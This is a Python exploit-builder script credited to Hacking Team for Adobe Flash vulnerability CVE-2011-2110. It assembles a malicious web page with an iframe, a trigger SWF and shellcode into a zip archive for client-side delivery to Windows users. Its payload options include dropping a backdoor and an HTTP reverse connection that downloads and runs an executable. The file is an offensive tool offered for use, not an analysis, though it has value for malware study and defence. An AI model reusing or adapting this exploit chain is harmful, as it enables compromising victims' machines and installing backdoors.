#! /usr/bin/env python

#Copyright HT srl, 2011
#http://www.hackingteam.it/ for more information

#cod

#
# Adobe Flash Player ActionScript Function Arguments Array Indexing
# vupen

import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile
import base64
import bz2
from random import *

import x86shelldrophttp
import x86int3
import ASCIIHexWhitespace
import x86helloworld
import jscript_unicode

NAME="apsb11_18"
DESCRIPTION="Adobe Flash Player ActionScript Function Arguments Array Indexing"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Adobe"
DOCUMENTATION["Repeatability"]="One Shot"
DOCUMENTATION["Date public"] = "2011/06/11"
DOCUMENTATION["CVE Name"] = "CVE-2011-2110"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2110"
DOCUMENTATION["Note"] = """A critical vulnerability has been identified in Adobe Flash Player 10.3.181.23 and earlier versions for Windows, Macintosh, Linux and Solaris, and Adobe Flash Player 10.3.185.23 and earlier versions for Android. This memory corruption vulnerability (CVE-2011-2110) could cause a crash and potentially allow an attacker to take control of the affected system. There are reports that this vulnerability is being exploited in the wild in targeted attacks via malicious Web pages.
Adobe recommends users of Adobe Flash Player 10.3.181.23 and earlier versions for Windows, Macintosh, Linux and Solaris update to Adobe Flash Player 10.3.181.26. Adobe recommends users of Adobe Flash Player 10.3.185.23 and earlier versions for Android update to Adobe Flash Player 10.3.185.24.
Note: This issue does not affect the Authplay.dll component that ships with Adobe Reader and Acrobat X (10.0.3) and earlier 10.x and 9.x versions for Windows and Macintosh operating systems."""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","XP", "VISTA", "SEVEN"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
"""

CHANGELOG="""

"""

DEBUGNOTES="""
"""

class exploit:
	
	infile =""
	outfile =""

	def __init__(self, backdoorPath, zipFile):
		#self.setInfo(DESCRIPTION)
		self.setVersions()
		self.r = Random()
		self.r.seed()
		self.name=NAME
		self.debugmode = dbg
		self.outputCompressed = zipFile
		self.backdoorPath = backdoorPath
		self.trigger_file = self.randfilename() + ".swf"

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename
	
	def displayVersions(self):
		for v in self.versions.keys():
			print "Version %d: %s"%(v,self.versions[v][0])

	def setVersions(self):
		self.versions={}
		#name, jmp esp, writeloc, writable, shelloc
		#                                    POP/POP/RET
		self.versions[1]=("Adobe Flash Player", 0x04040404)
   
	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.backdoorPath)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.backdoorPath)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	
	def run(self):
		self.makefile()
				
		return 1

	def get_root_index_content(self):
		value = """
<br>
<br>Adobe Flash Player ActionScript
<br>
<iframe src="exploit.swf"></iframe>"""

		#adapter = jscript_unicode.jscript_unicode()
		#shellcode = self.createShellcode()
		#shellcode = adapter.get2(shellcode, "\u")
		
		#html = html.replace("#{shellcode}", '\"' + shellcode + '\"')

		html = value
		return html

	def makefile(self):
	
		html_index = self.get_root_index_content()
		
		with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp_index = os.tempnam()
			tmp_shellcode = os.tempnam()
		
		f = open(tmp_index,mode='wb')
		f.write(html_index)
		f.close()
		
		f = open(tmp_shellcode,mode='wb')
		f.write(self.createShellcode())
		f.close()
		
		# Create the output archive
		print "Creating %s zip file archive"%(self.outputCompressed)
		zip = zipfile.ZipFile(self.outputCompressed, "w", zipfile.ZIP_DEFLATED)
		
		print "Adding index file"
		zip.write(tmp_index, "index.html")
		
		print "Adding swf from resources"
		zip.write("resources/apsb11_18.swf", "exploit.swf")

		print "Adding shellcode"
		zip.write(tmp_shellcode, "scode.txt")
		
		#if extraPath != None:
		#	print "Adding copy of backdoor"
		#	zip.write(extraPath, "backdoor.exe")

		zip.close()
		
		try:
			os.unlink(tmp_index)
			os.unlink(tmp_shellcode)
		except WindowsError:
			print "I/O error when deleting temp. files"
			
		return 1


if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] {payload:[http|local|debug]} [localbackdoor|urltodownload] output"
		sys.exit(0)

	# Parse payload section
	if sys.argv[1].split(':')[0] != "payload":
		print "[ERROR] First parameters must be payload"
		sys.exit(0)
	else:
		requiredpayload = sys.argv[1].split(':')[1]	
		if requiredpayload == "http":
			print "[HTTP] Using HTTP reverse connect to download exe"
			payload = 1
			http = True
			#if len(sys.argv) > 3:
			#	extraPath = sys.argv[4]
			#else:
			#	extraPath = None
				
		elif requiredpayload == "debug":
			print "[DEBUG] Using INT3 exploit mode"
			payload = 0
			dbg = True
		elif requiredpayload == "local":
			print "[LOCAL] Run from %currdir%"
			payload = 2
		else:
			print "[ERROR] Unknown payload defined"
			sys.exit(0)
	
	# Interprete section
	
	if http == False:
		if os.path.isfile(sys.argv[3]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[3])
			sys.exit(0)

		if os.path.getsize(sys.argv[3]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[3])
			sys.exit(0)

	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)

	app=exploit(sys.argv[2], sys.argv[3])
	app.run()
	
	print ' ... done'
